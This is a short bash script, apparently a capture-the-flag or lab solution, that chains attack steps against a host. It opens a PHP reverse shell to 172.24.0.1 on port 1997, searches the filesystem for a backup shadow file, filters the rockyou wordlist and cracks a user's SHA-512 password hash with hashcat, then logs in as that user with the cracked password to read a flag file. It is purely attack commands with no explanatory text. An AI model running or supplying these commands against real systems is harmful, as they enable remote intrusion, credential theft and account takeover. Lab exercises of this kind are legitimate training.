#!/bin/bash

php -r '$sock=fsockopen("172.24.0.1", 1997);exec("/bin/sh -i <&3 >&3 2>&3");'
find / -name 'shadow.bak' 2>/dev/null
cat ~/tools/SecLists/Passwords/Leaked-Databases/rockyou.txt | grep "cherry" > rockyou_cherry_filter.txt
hashcat -a 0 -m 1800 user2_hash rockyou_cherry_filter.txt
su - user2 <<!
!!cherry!!
cat /home/user2/flag1.txt
!